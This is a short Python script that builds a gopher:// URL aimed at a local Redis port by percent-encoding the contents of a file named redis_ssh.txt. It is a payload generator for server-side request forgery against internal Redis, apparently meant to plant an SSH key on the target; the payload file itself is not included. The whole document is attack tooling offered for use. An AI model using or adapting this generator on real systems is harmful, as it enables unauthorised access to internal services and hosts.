def main():
    payload = 'gopher://127.0.0.1:6379/_'
    with open("./payload/redis_ssh.txt", 'rb') as fp:
        for line in fp.readlines():
            for c in line:
                if c != 13 and c != 10:
                    payload += "%"+hex(c)[2:]
                if c == 13:
                    payload += '%0d'
                if c == 10:
                    payload += '%0a'
        payload += '%0d%0a'
        print(payload)

if __name__ == "__main__":
    main()